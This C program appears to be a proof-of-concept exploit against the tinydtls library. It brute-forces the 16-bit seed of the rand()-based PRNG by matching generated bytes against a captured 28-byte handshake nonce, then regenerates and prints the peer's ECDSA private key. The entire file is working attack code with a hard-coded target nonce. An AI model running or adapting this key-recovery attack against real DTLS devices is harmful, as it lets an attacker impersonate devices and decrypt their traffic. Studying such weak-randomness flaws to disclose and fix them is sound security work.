#include "tinydtls.h" 

#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <ctype.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>

#include "global.h" 
#include "dtls_debug.h"
#include "dtls.h" 


static inline int
dtls_prng(unsigned char *buf, size_t len) {
  while (len--)
    *buf++ = rand() & 0xFF;
  return 1;
}

int test_seed(int32_t seed, uint8 *nonce_check, char *privkey_res) {
    uint8 pubx[64];
    uint8 *puby = pubx+32;
    uint8 privkey[32];  
    uint8 prngout[28];  

    
    srand((unsigned short)seed);
    dtls_prng(prngout, 12);  // first 12 bytes are cookie seed, don't have it...
    dtls_prng(prngout, 28);  // This should be the nonce


    if (memcmp(prngout, nonce_check, 28) == 0) {
      memset(privkey, 0, 32);
      dtls_ecdsa_generate_key(privkey, pubx, puby, 32);
      memcpy(privkey_res, privkey, 32);
      return 1;
    }
    return 0;
}



void printHex(char* digits, int len)
{
    int i;
    char* str;
    char temp[3];

    str = malloc(len * 2 + 1);
    memset(str, 0, len * 2 + 1);
    for(i = 0; i < len; ++i)
    {
        sprintf(temp, "%02hhx", digits[i]);
        strcat(str, temp);
    }
    printf("%s\n", str);
    free(str);
}

int main(){
  uint8 nonce_check[] = "\x1a\x2c\xfd\x1e\xf\x76\x61\x48\xf3\x51\xd7\xcb\xa6\xdb\xa4\xd3\x91\xa\xc\xd7\x12\xa2\x86\x4\xaf\x4\x3d\xfe";

  char privkey_recovered[32];

  for (int32_t i = 0; i < 65536; i++) {
    if (test_seed(i, nonce_check, privkey_recovered)) {
      printf("Correct seed: %d\n", i);
      puts("Recovered private key:");
      printHex(privkey_recovered, sizeof(privkey_recovered));
      break;
    }
  }
}
